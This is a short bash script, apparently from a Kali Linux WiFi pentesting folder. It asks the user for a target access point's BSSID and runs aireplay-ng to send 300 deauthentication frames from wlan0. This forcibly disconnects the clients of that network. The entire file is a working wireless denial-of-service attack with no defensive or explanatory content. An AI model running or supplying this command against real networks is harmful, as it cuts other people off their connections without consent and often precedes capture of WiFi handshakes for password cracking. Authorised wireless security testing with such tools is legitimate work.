#!/bin/bash
cd /home/kali/WifiPentesting/testingSomething
echo "enter the bssid of the target "
read BSSID 
sudo aireplay-ng -a $BSSID --deauth 300 wlan0 

